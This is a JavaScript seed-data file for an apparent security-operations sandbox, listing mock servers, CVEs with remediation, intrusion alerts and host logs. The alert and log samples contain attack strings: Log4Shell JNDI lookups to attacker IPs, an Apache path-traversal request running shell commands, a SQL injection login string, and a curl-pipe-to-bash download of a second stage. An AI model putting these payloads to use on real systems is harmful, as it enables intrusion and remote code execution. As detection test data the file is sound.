'use strict';

// Sandbox seed data. `minutes_ago` is resolved against boot time so a fresh
// install always shows a recent queue instead of stale timestamps.

const assets = [
  { ip_address: '10.0.4.15', hostname: 'prod-web-core', os_family: 'Linux', os_version: 'Ubuntu 22.04 LTS', owner: 'Search platform',
    running_services: [{ port: 80, service: 'nginx/1.18.0' }, { port: 8080, service: 'Apache Tomcat/9.0.50 with Log4j 2.14.1' }],
    installed_packages: ['log4j-core-2.14.1.jar', 'openjdk-11-jdk', 'nginx-core'], criticality: 'CRITICAL', waf_enabled: false },
  { ip_address: '10.0.4.22', hostname: 'auth-srv-edge', os_family: 'Linux', os_version: 'Debian 11 Bullseye', owner: 'Identity',
    running_services: [{ port: 443, service: 'nginx/1.22.1' }, { port: 5000, service: 'Python FastAPI / Uvicorn' }],
    installed_packages: ['python3.10', 'fastapi-0.95', 'uvicorn', 'openssl-1.1.1w'], criticality: 'HIGH', waf_enabled: true },
  { ip_address: '10.0.4.88', hostname: 'legacy-app-portal', os_family: 'Linux', os_version: 'CentOS 7.9', owner: 'Partner portal',
    running_services: [{ port: 80, service: 'Apache httpd 2.4.49 (PHP 7.4.3)' }, { port: 3306, service: 'MySQL 5.7' }],
    installed_packages: ['httpd-2.4.49', 'php-7.4.3', 'mysql-server-5.7'], criticality: 'HIGH', waf_enabled: false },
  { ip_address: '10.0.4.102', hostname: 'bastion-host-01', os_family: 'Linux', os_version: 'Alpine Linux 3.18', owner: 'Infrastructure',
    running_services: [{ port: 22, service: 'OpenSSH 8.9p1' }],
    installed_packages: ['openssh-server', 'iptables', 'fail2ban'], criticality: 'CRITICAL', waf_enabled: false },
  { ip_address: '10.0.6.40', hostname: 'build-runner-02', os_family: 'Linux', os_version: 'Ubuntu 24.04 LTS', owner: 'Developer tooling',
    running_services: [{ port: 22, service: 'OpenSSH 9.6p1' }, { port: 9000, service: 'Gitea Actions runner' }],
    installed_packages: ['openssh-server', 'docker-ce', 'act_runner-0.2.10'], criticality: 'MEDIUM', waf_enabled: false }
];

// `match` lists lowercase fragments that, when found in an asset's packages or
// services, mean the asset runs an affected component.
const cves = [
  { cve_id: 'CVE-2021-44228', title: 'Log4Shell JNDI remote code execution', cvss_score: 10.0, severity: 'CRITICAL',
    affected_products: ['Apache Log4j2', 'Apache Tomcat', 'Spring Boot'], vulnerable_versions: '2.0-beta9 <= Log4j < 2.15.0',
    exploit_vector: 'Network / JNDI lookup', match: ['log4j-core-2.14', 'log4j 2.14'],
    description: 'Log4j2 JNDI lookups in logged data are not restricted. An attacker who controls a logged string can make the JVM fetch and run remote code.',
    remediation: 'Upgrade to Log4j 2.17.1, or set log4j2.formatMsgNoLookups=true and block outbound LDAP/RMI at the perimeter.' },
  { cve_id: 'CVE-2021-41773', title: 'Apache HTTP Server 2.4.49 path traversal', cvss_score: 7.5, severity: 'HIGH',
    affected_products: ['Apache HTTP Server'], vulnerable_versions: '2.4.49', exploit_vector: 'Network / URL-encoded traversal',
    match: ['httpd-2.4.49', 'httpd 2.4.49'],
    description: 'A path normalisation flaw lets URLs map outside Alias-like directories. With mod_cgi enabled it becomes remote code execution.',
    remediation: 'Upgrade to Apache HTTP Server 2.4.51 or later and deny access to the filesystem root.' },
  { cve_id: 'CVE-2021-42013', title: 'Apache HTTP Server 2.4.50 traversal bypass', cvss_score: 9.8, severity: 'CRITICAL',
    affected_products: ['Apache HTTP Server'], vulnerable_versions: '2.4.49, 2.4.50', exploit_vector: 'Network / double-encoded traversal',
    match: ['httpd-2.4.49', 'httpd 2.4.49', 'httpd-2.4.50'],
    description: 'The 2.4.50 fix for CVE-2021-41773 was incomplete; double-encoded sequences still escape the document root.',
    remediation: 'Upgrade to Apache HTTP Server 2.4.51 or later.' },
  { cve_id: 'CWE-89', title: 'SQL injection (weakness class)', cvss_score: 8.6, severity: 'HIGH',
    affected_products: ['PHP web applications', 'MySQL'], vulnerable_versions: 'Apps that build SQL from raw input',
    exploit_vector: 'HTTP parameter injection', match: ['php-', 'php '],
    description: 'Input concatenated into SQL can change query logic, bypass login, or leak data.',
    remediation: 'Parameterised queries, least-privilege DB accounts, WAF virtual patching for legacy paths.' },
  { cve_id: 'AEGIS-SSH-BF', title: 'SSH credential brute force (internal tracking id)', cvss_score: 7.5, severity: 'HIGH',
    affected_products: ['OpenSSH Server'], vulnerable_versions: 'Any SSH service with password auth',
    exploit_vector: 'Port 22 password spray', match: ['openssh'],
    description: 'Automated dictionary spraying against SSH aiming for interactive root or service-account access.',
    remediation: 'Disable password auth, enforce Ed25519 keys, rate-limit with fail2ban, block the source.' }
];

const alerts = [
  { alert_id: 'ALERT-2026-9001', signature: 'ET EXPLOIT Apache Log4j RCE attempt (CVE-2021-44228) JNDI lookup in User-Agent',
    category: 'Exploit / RCE', severity: 'CRITICAL', source_ip: '185.220.101.45', dest_ip: '10.0.4.15', dest_port: 8080, protocol: 'TCP/HTTP', sensor: 'suricata-dmz-01',
    raw_payload: 'GET /api/v1/search?q=test HTTP/1.1\r\nHost: 10.0.4.15:8080\r\nUser-Agent: ${jndi:ldap://185.220.101.45:1389/Exploit}\r\nX-Forwarded-For: ${jndi:rmi://185.220.101.45:1099/obj}\r\nAccept: */*',
    minutes_ago: 38 },
  { alert_id: 'ALERT-2026-9002', signature: 'SURICATA HTTP Apache 2.4.49 path traversal attempt (CVE-2021-41773)',
    category: 'Exploit / Traversal', severity: 'CRITICAL', source_ip: '194.26.29.112', dest_ip: '10.0.4.88', dest_port: 80, protocol: 'TCP/HTTP', sensor: 'suricata-dmz-01',
    raw_payload: 'POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\r\nHost: 10.0.4.88\r\nContent-Type: text/plain\r\nContent-Length: 21\r\n\r\necho; id; uname -a',
    minutes_ago: 121 },
  { alert_id: 'ALERT-2026-9003', signature: 'SNORT Log4j JNDI exploit string targeting auth gateway',
    category: 'Exploit / RCE', severity: 'HIGH', source_ip: '45.154.255.89', dest_ip: '10.0.4.22', dest_port: 443, protocol: 'TCP/HTTPS', sensor: 'snort-edge-02',
    raw_payload: 'GET /auth/login HTTP/1.1\r\nHost: auth.internal\r\nUser-Agent: ${jndi:ldap://45.154.255.89:1389/Exploit}\r\nAuthorization: Bearer ${jndi:ldap://45.154.255.89:1389/token}',
    minutes_ago: 296 },
  { alert_id: 'ALERT-2026-9004', signature: 'ET SCAN Potential SSH brute force inbound (>50 failed auth in 60s)',
    category: 'Credential Access', severity: 'MEDIUM', source_ip: '103.145.13.78', dest_ip: '10.0.4.102', dest_port: 22, protocol: 'TCP/SSH', sensor: 'zeek-core-01',
    raw_payload: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\nFailed password for root from 103.145.13.78 port 48212 ssh2',
    minutes_ago: 472 },
  { alert_id: 'ALERT-2026-9005', signature: 'ET WEB_SERVER SQL injection attempt in POST body (OR 1=1)',
    category: 'Exploit / Injection', severity: 'HIGH', source_ip: '91.240.118.172', dest_ip: '10.0.4.88', dest_port: 80, protocol: 'TCP/HTTP', sensor: 'suricata-dmz-01',
    raw_payload: "POST /login.php HTTP/1.1\r\nHost: portal.internal\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin'+OR+1=1--&pass=x",
    minutes_ago: 655 },
  { alert_id: 'ALERT-2026-9006', signature: 'ET MALWARE Periodic TLS beacon to known C2 infrastructure',
    category: 'Command and Control', severity: 'CRITICAL', source_ip: '10.0.4.88', dest_ip: '194.26.29.112', dest_port: 443, protocol: 'TCP/TLS', sensor: 'zeek-core-01',
    raw_payload: 'TLS ClientHello SNI=cdn-static-update.net JA3=72a589da586844d7f0818ce684948eea interval=60s jitter=4% bytes_out=1.2KB',
    minutes_ago: 94 }
];

const logs = [
  { host_ip: '10.0.4.15', log_type: 'http_access', status_code: 200, request_method: 'GET', request_uri: '/api/v1/search?q=test', client_ip: '185.220.101.45', minutes_ago: 38,
    raw_entry: '185.220.101.45 - - "GET /api/v1/search?q=test HTTP/1.1" 200 4820 "-" "${jndi:ldap://185.220.101.45:1389/Exploit}"' },
  { host_ip: '10.0.4.15', log_type: 'system', client_ip: '185.220.101.45', minutes_ago: 38,
    raw_entry: 'catalina.out WARN o.a.l.log4j.core.net.JndiManager - JNDI lookup for ldap://185.220.101.45:1389/Exploit, connecting to remote server' },
  { host_ip: '10.0.4.15', log_type: 'edr_process', client_ip: '185.220.101.45', minutes_ago: 37,
    raw_entry: 'EDR: java (pid 1420) spawned unexpected child /bin/sh -c "curl -s http://185.220.101.45/stage2.sh | bash"' },
  { host_ip: '10.0.4.88', log_type: 'http_access', status_code: 200, request_method: 'POST', request_uri: '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh', client_ip: '194.26.29.112', minutes_ago: 121,
    raw_entry: '194.26.29.112 - - "POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200 142 "-" "curl/7.68.0"' },
  { host_ip: '10.0.4.88', log_type: 'edr_process', client_ip: '194.26.29.112', minutes_ago: 120,
    raw_entry: 'EDR: httpd (pid 2231) spawned /bin/sh -c "echo; id; uname -a" as user daemon' },
  { host_ip: '10.0.4.88', log_type: 'edr_process', client_ip: '194.26.29.112', minutes_ago: 96,
    raw_entry: 'EDR: /tmp/.ICE-unix/kworkerd (ppid 2231 httpd) opened outbound TLS to 194.26.29.112:443 every 60s' },
  { host_ip: '10.0.4.22', log_type: 'http_access', status_code: 401, request_method: 'GET', request_uri: '/auth/login', client_ip: '45.154.255.89', minutes_ago: 296,
    raw_entry: '45.154.255.89 - - "GET /auth/login HTTP/1.1" 401 52 "-" "${jndi:ldap://45.154.255.89:1389/Exploit}"' },
  { host_ip: '10.0.4.22', log_type: 'system', client_ip: '45.154.255.89', minutes_ago: 296,
    raw_entry: 'uvicorn.access INFO - Invalid authorization token format. No outbound socket connections created.' },
  { host_ip: '10.0.4.102', log_type: 'auth_log', client_ip: '103.145.13.78', minutes_ago: 473,
    raw_entry: 'sshd[811]: Failed password for root from 103.145.13.78 port 48212 ssh2' },
  { host_ip: '10.0.4.102', log_type: 'auth_log', client_ip: '103.145.13.78', minutes_ago: 473,
    raw_entry: 'sshd[811]: Failed password for invalid user admin from 103.145.13.78 port 48230 ssh2 (x57 in 60s)' },
  { host_ip: '10.0.4.102', log_type: 'system', client_ip: '103.145.13.78', minutes_ago: 472,
    raw_entry: 'fail2ban.actions NOTICE [sshd] Ban 103.145.13.78' },
  { host_ip: '10.0.4.88', log_type: 'http_access', status_code: 400, request_method: 'POST', request_uri: '/login.php', client_ip: '91.240.118.172', minutes_ago: 655,
    raw_entry: '91.240.118.172 - - "POST /login.php HTTP/1.1" 400 312 "-" "sqlmap/1.7.2#stable"' },
  { host_ip: '10.0.4.88', log_type: 'system', client_ip: '91.240.118.172', minutes_ago: 655,
    raw_entry: 'php-fpm: PDO prepared statement rejected malformed credential input, no rows returned' },
  { host_ip: '10.0.6.40', log_type: 'auth_log', client_ip: '10.0.4.102', minutes_ago: 180,
    raw_entry: 'sshd[1203]: Accepted publickey for deploy from 10.0.4.102 port 51022 ssh2: ED25519 SHA256:q2m...' }
];

const firewallRules = [
  { rule_id: 'FW-0001', target_ip: '45.95.147.236', action: 'BLOCK', reason: 'Known Mirai scanning infrastructure (threat-intel import).',
    enacted_by: 'Threat intel import', is_active: true, packets_dropped: 12840, minutes_ago: 4320 }
];

const defaultConfig = {
  autoContainmentThreshold: 'HIGH',
  isolateOnCompromise: true,
  maxIterations: 12,
  alertRetentionDays: 90,
  analystName: 'On-call analyst'
};

module.exports = { assets, cves, alerts, logs, firewallRules, defaultConfig };